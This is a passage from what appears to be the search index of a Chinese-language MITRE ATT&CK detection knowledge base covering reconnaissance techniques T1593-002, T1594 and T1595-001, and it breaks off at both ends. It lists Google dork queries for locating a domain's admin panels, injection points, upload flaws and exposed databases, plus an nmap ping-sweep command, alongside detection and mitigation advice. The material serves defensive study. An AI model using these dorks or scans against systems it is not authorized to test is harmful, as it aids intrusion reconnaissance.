\u903b\u8f91\u4e0e\uff0c\u8fd9\u4e2a\u547d\u4ee4\u6211\u4eec\u5176\u5b9e\u4e00\u76f4\u90fd\u5728\u7528\uff0c\u53ea\u662f\u6ca1\u6709\u610f\u8bc6\u5230\u3002\u4e00\u822c\u7528\u7a7a\u683c\u4ee3\u66ff\uff0c\u8fd8\u53ef\u4ee5\u7528\u201c+\u201d\u4ee3\u66ff\u3002\u4f8b\u5982\u9739\u96f3\u5e03\u888b+\u8d25\u4ea1\u4e4b\u5251\uff0c\u8fd4\u56de\u7684\u7ed3\u679c\u540c\u65f6\u5305\u542b\u4e24\u8005\u3002 * weather: \u67e5\u8be2\u67d0\u4e00\u5730\u533a\u6216\u57ce\u5e02\u7684\u5929\u6c14\u3002\u4e0d\u8fc7\u6211\u4eec\u8fd9\u4e00\u5730\u533a\u6216\u57ce\u5e02\u5fc5\u987b\u662fGoogle\u80fd\u8bc6\u522b\u7684\uff0c\u4f8bweather:beijing\uff0cGoogle\u5c06\u4f1a\u7ed9\u6211\u4eec\u8fd4\u56de\u5317\u4eac\u7684\u5929\u6c14\u3002 * \u661f\u53f7\uff08*\uff09: \u901a\u914d\u7b26\uff0c\u53ef\u4ee5\u5339\u914d\u4efb\u610f\u5b57\u7b26\u4e32\u3002\u4f8b\u5982\u641c\u7d22*\u64ce\uff0c\u5219\u8fd4\u56de\u7684\u7ed3\u679c\u4e2d\u4e0d\u4ec5\u6709\u201c\u641c\u7d22\u5f15\u64ce\u201d\uff0c\u8fd8\u6709\u201c\u641c\u7d22\u5de8\u64ce\u201d\u4e4b\u7c7b\u7684\u3002 * allinurl: \u7ed3\u679c\u7684url\u4e2d\u5305\u542b\u591a\u4e2a\u5173\u952e\u8bcd\u3002\u4f8b\u5982allinurl:byr jobs\uff0c\u7b49\u4e8einurl:byr inurl:jobs\u3002allinurl\u4e5f\u662f\u6392\u4ed6\u6027\u6307\u4ee4 * define: \u67e5\u8be2\u5173\u952e\u8bcd\u7684\u8bcd\u4e49\uff0c\u8d77\u7684\u662f\u5b57\u5178\u7684\u4f5c\u7528\u3002Google\u4f1a\u8fd4\u56de\u5305\u542b\u67e5\u8be2\u5173\u952e\u8bcd\u5b9a\u4e49\u7684\u7f51\u9875\uff0c\u4f8bdefine:computer\uff0c\u652f\u6301\u6c49\u5b57\u54e6\uff01 \u8fdb\u9636\u7bc7\uff1a * \u67e5\u627e\u540e\u53f0\u5730\u5740\uff1asite:\u57df\u540d inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms * \u67e5\u627e\u6587\u672c\u5185\u5bb9\uff1asite:\u57df\u540d intext:\u7ba1\u7406|\u540e\u53f0|\u767b\u9646|\u7528\u6237\u540d|\u5bc6\u7801|\u9a8c\u8bc1\u7801|\u7cfb\u7edf|\u5e10\u53f7|admin|login|sys|managetem|password|username * \u67e5\u627e\u53ef\u6ce8\u5165\u70b9\uff1asite:\u57df\u540d inurl:aspx|jsp|php|asp * \u67e5\u627e\u4e0a\u4f20\u6f0f\u6d1e\uff1asite:\u57df\u540d inurl:file|load|editor|Files * \u67e5\u770b\u811a\u672c\u7c7b\u578b\uff1asite:\u57df\u540d filetype:asp/aspx/php/jsp * \u8fc2\u56de\u7b56\u7565\uff1ainurl:cms/data/templates/images/index/ * \u7f51\u7edc\u8bbe\u5907\u5173\u952e\u8bcd\uff1aintext:WEB Management Interface for H3C SecPath Series * \u5b58\u5728\u7684\u6570\u636e\u5e93\uff1asite:\u57df\u540d filetype:mdb|asp|#","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_7","text":"MITRE-ATT&CK-T1593-002 https://attack.mitre.org/techniques/T1593/002/ Github Hacking | Google Hacking- \u4fe1\u606f\u641c\u96c6\u7bc7 - \u6e17\u900f\u7ea2\u961f\u7b14\u8bb0 https://cloud.tencent.com/developer/article/1752139 Google Hacking\u603b\u7ed3 https://www.jianshu.com/p/f8062e2cc1d7 \u4fe1\u606f\u6536\u96c6\u4e4bGoogle Hacking\u7684\u7b80\u5355\u7528\u6cd5 https://blog.csdn.net/qq_36119192/article/details/84029809","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/","text":"T1594-\u641c\u7d22\u53d7\u5bb3\u8005\u6240\u62e5\u6709\u7684\u7f51\u7ad9 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff0c\u4ee5\u83b7\u53d6\u53ef\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u7684\u4fe1\u606f\u3002\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\u53ef\u80fd\u5305\u542b\u5404\u79cd\u7ec6\u8282\uff0c\u5305\u62ec\u90e8\u95e8/\u5206\u90e8\u7684\u540d\u79f0\u3001\u7269\u7406\u4f4d\u7f6e\u548c\u5173\u952e\u5458\u5de5\u7684\u6570\u636e\uff0c\u5982\u59d3\u540d\u3001\u89d2\u8272\u548c\u8054\u7cfb\u4fe1\u606f\uff08\u4f8b\u5982\uff1a\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff09\u3002\u8fd9\u4e9b\u7f51\u7ad9\u8fd8\u53ef\u80fd\u6709\u7a81\u51fa\u5546\u4e1a\u8fd0\u4f5c\u548c\u5173\u7cfb\u7684\u7ec6\u8282\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff0c\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u5f0f\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u4e1a\u52a1\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u8d26\u6237\u6216\u7834\u574f\u8d26\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4fe1\u4efb\u5173\u7cfb\u6216\u9493\u9c7c\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4e2a\u4eba\u7406\u89e3\uff1a\u6536\u96c6\u7f51\u7ad9\u4e0a\u516c\u5e03\u7684\u4eba\u4e8b\u4fe1\u606f\uff08\u653f\u5e9c\u7f51\u7ad9\u5c45\u591a\uff09\u3001\u7ba1\u7406\u5458\u90ae\u7bb1\u4fe1\u606f\u7b49\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0 \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1594 https://attack.mitre.org/techniques/T1594","title":"T1594-\u641c\u7d22\u53d7\u5bb3\u8005\u6240\u62e5\u6709\u7684\u7f51\u7ad9"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#t1594-","text":"","title":"T1594-\u641c\u7d22\u53d7\u5bb3\u8005\u6240\u62e5\u6709\u7684\u7f51\u7ad9"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff0c\u4ee5\u83b7\u53d6\u53ef\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u7684\u4fe1\u606f\u3002\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\u53ef\u80fd\u5305\u542b\u5404\u79cd\u7ec6\u8282\uff0c\u5305\u62ec\u90e8\u95e8/\u5206\u90e8\u7684\u540d\u79f0\u3001\u7269\u7406\u4f4d\u7f6e\u548c\u5173\u952e\u5458\u5de5\u7684\u6570\u636e\uff0c\u5982\u59d3\u540d\u3001\u89d2\u8272\u548c\u8054\u7cfb\u4fe1\u606f\uff08\u4f8b\u5982\uff1a\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff09\u3002\u8fd9\u4e9b\u7f51\u7ad9\u8fd8\u53ef\u80fd\u6709\u7a81\u51fa\u5546\u4e1a\u8fd0\u4f5c\u548c\u5173\u7cfb\u7684\u7ec6\u8282\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff0c\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u5f0f\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u4e1a\u52a1\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u8d26\u6237\u6216\u7834\u574f\u8d26\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4fe1\u4efb\u5173\u7cfb\u6216\u9493\u9c7c\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_1","text":"\u4e2a\u4eba\u7406\u89e3\uff1a\u6536\u96c6\u7f51\u7ad9\u4e0a\u516c\u5e03\u7684\u4eba\u4e8b\u4fe1\u606f\uff08\u653f\u5e9c\u7f51\u7ad9\u5c45\u591a\uff09\u3001\u7ba1\u7406\u5458\u90ae\u7bb1\u4fe1\u606f\u7b49\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_2","text":"\u65e0","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_7","text":"MITRE-ATT&CK-T1594 https://attack.mitre.org/techniques/T1594","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/","text":"T1595-001-\u4e3b\u52a8\u626b\u63cf_\u626b\u63cf\u5730\u5740\u6bb5 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5b9e\u65bd\u653b\u51fb\u524d\u626b\u63cfIP\u5730\u5740\u5757\uff0c\u6536\u96c6\u53ef\u5728\u786e\u5b9a\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u7684\u4fe1\u606f\u3002\u516c\u6709IP\u5730\u5740\u53ef\u4ee5\u6309\u5757\u6216\u662f\u6309\u4e00\u7cfb\u5217\u987a\u5e8f\u5730\u5740\u5206\u914d\u7ed9\u7ec4\u7ec7\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u626b\u63cfIP\u5730\u5740\u5757\uff0c\u4ee5\u4fbf\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f\uff0c\u4f8b\u5982\u54ea\u4e9bIP\u5730\u5740\u5206\u914d\u7ed9\u4e86\u54ea\u4e9b\u4e3b\u673a\u4f7f\u7528\u4ee5\u53ca\u8fd9\u4e9b\u4e3b\u673a\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u626b\u63cf\u8303\u56f4\u53ef\u4ee5\u4ece\u7b80\u5355\u7684ping\uff08ICMP\u8bf7\u6c42\u548c\u54cd\u5e94\uff09\u5230\u66f4\u7ec6\u81f4\u7684\u626b\u63cf\uff08\u901a\u8fc7\u670d\u52a1\u5668banner\u6216\u5176\u4ed6\u7f51\u7edcartifacts\u663e\u793a\u4e3b\u673a\u8f6f\u4ef6/\u7248\u672c\uff09\u3002\u626b\u63cf\u6240\u83b7\u53d6\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5e38\u89c1\u626b\u63cf\u5668 \u68c0\u6d4b\u65e5\u5fd7 HTTP\u6d41\u91cf \u6d4b\u8bd5\u590d\u73b0 nmap\u626b\u63cf\u7f51\u6bb5\u5185\u7684\u6240\u6709IP\u5730\u5740 sudo nmap -sP -PI -PT 192.168.1.0/24 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u5b9e\u9645\u4e0a\uff0c\u5f88\u96be\u5728\u771f\u5b9e\u7684\u73af\u5883\u4e2d\u53d1\u73b0\u6b64\u7c7b\u884c\u4e3a\u3002\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u90e8\u7f72\u871c\u7f50\u6765\u8fdb\u884c\u76d1\u6d4b\u9632\u5fa1\uff0c\u5f53\u53d1\u73b0\u6709\u653b\u51fb\u8005\u8bbf\u95ee\u4e86\u540c\u4e00\u7f51\u6bb5\u4e0d\u540c\u5730\u5740\u7684\u871c\u7f50\uff0c\u4ea7\u751f\u544a\u8b66\u884c\u4e3a\uff0c\u5219\u8bf4\u660e\u53ef\u80fd\u5b58\u5728\u626b\u63cf\u884c\u4e3a\u3002\u503c\u5f97\u5f15\u8d77\u5b89\u5168\u4eba\u5458\u7684\u6ce8\u610f\uff01 \u5efa\u8bae \u76d1\u63a7\u53ef\u80fd\u5b58\u5728\u626b\u63cf\u7684\u53ef\u7591\u7f51\u7edc\u6d41\u91cf\uff0c\u4f8b\u5982\u6765\u81ea\u5355\u4e2a\u6e90\u7684\u5927\u91cf\u6d41\u91cf\uff08\u5c24\u5176\u662f\u5982\u679c\u5df2\u77e5\u8be5\u6e90\u4e0e\u653b\u51fb\u8005\u6216\u50f5\u5c38\u7f51\u7edc\u76f8\u5173\u8054\uff09\u3002\u5206\u6790Web\u8bbf\u95ee\u6570\u636e\u4e5f\u53ef\u80fd\u4f1a\u53d1\u73b0\u6f5c\u5728\u6076\u610f\u6d3b\u52a8\u7684\u7279\u5f81\uff0c\u4f8b\u5982referer\u503c\u6216HTTP/S\u4e2d\u7684user-agent\u5b57\u6bb5\u91cc\u5b57\u7b26\u4e32\u3002 \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1595-001 https://attack.mitre.org/techniques/T1595/001/ \u5e38\u89c1\u626b\u63cf\u5668\u6216\u8005\u81ea\u52a8\u5316\u5de5\u5177\u7684\u7279\u5f81\uff08\u6307\u7eb9\uff09 https://www.freebuf.com/column/156291.html","title":"T1595-001-\u4e3b\u52a8\u626b\u63cf_\u626b\u63cf\u5730\u5740\u6bb5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#t1595-001-_","text":"","title":"T1595-001-\u4e3b\u52a8\u626b\u63cf_\u626b\u63cf\u5730\u5740\u6bb5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5b9e\u65bd\u653b\u51fb\u524d\u626b\u63cfIP\u5730\u5740\u5757\uff0c\u6536\u96c6\u53ef\u5728\u786e\u5b9a\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u7684\u4fe1\u606f\u3002\u516c\u6709IP\u5730\u5740\u53ef\u4ee5\u6309\u5757\u6216\u662f\u6309\u4e00\u7cfb\u5217\u987a\u5e8f\u5730\u5740\u5206\u914d\u7ed9\u7ec4\u7ec7\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u626b\u63cfIP\u5730\u5740\u5757\uff0c\u4ee5\u4fbf\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f\uff0c\u4f8b\u5982\u54ea\u4e9bIP\u5730\u5740\u5206\u914d\u7ed9\u4e86\u54ea\u4e9b\u4e3b\u673a\u4f7f\u7528\u4ee5\u53ca\u8fd9\u4e9b\u4e3b\u673a\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u626b\u63cf\u8303\u56f4\u53ef\u4ee5\u4ece\u7b80\u5355\u7684ping\uff08ICMP\u8bf7\u6c42\u548c\u54cd\u5e94\uff09\u5230\u66f4\u7ec6\u81f4\u7684\u626b\u63cf\uff08\u901a\u8fc7\u670d\u52a1\u5668banner\u6216\u5176\u4ed6\u7f51\u7edcartifacts\u663e\u793a\u4e3b\u673a\u8f6f\u4ef6/\u7248\u672c\uff09\u3002\u626b\u63cf\u6240\u83b7\u53d6\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_1","text":"\u5e38\u89c1\u626b\u63cf\u5668","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_2","text":"HTTP\u6d41\u91cf","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_3","text":"nmap\u626b\u63cf\u7f51\u6bb5\u5185\u7684\u6240\u6709IP\u5730\u5740 sudo nmap -sP -PI -PT 192.168.1.0/24","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_4","text":"\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_5","text":"\u5b9e\u9645\u4e0a\uff0c\u5f88\u96be\u5728\u771f\u5b9e\u7684\u73af\u5883\u4e2d\u53d1\u73b0\u6b64\u7c7b\u884c\u4e3a\u3002\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u90e8\u7f72\u871c\u7f50\u6765\u8fdb\u884c\u76d1\u6d4b\u9632\u5fa1\uff0c\u5f53\u53d1\u73b0\u6709\u653b\u51fb\u8005\u8bbf\u95ee\u4e86\u540c\u4e00\u7f51\u6bb5\u4e0d\u540c\u5730\u5740\u7684\u871c\u7f50\uff0c\u4ea7\u751f\u544a\u8b66\u884c\u4e3a\uff0c\u5219\u8bf4\u660e\u53ef\u80fd\u5b58\u5728\u626b\u63cf\u884c\u4e3a\u3002\u503c\u5f97\u5f15\u8d77\u5b89\u5168\u4eba\u5458\u7684\u6ce8\u610f\uff01","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_6","text":"\u76d1\u63a7\u53ef\u80fd\u5b58\u5728\u626b\u63cf\u7684\u53ef\u7591\u7f51\u7edc\u6d41\u91cf\uff0c\u4f8b\u5982\u6765\u81ea\u5355\u4e2a\u6e90\u7684\u5927\u91cf\u6d41\u91c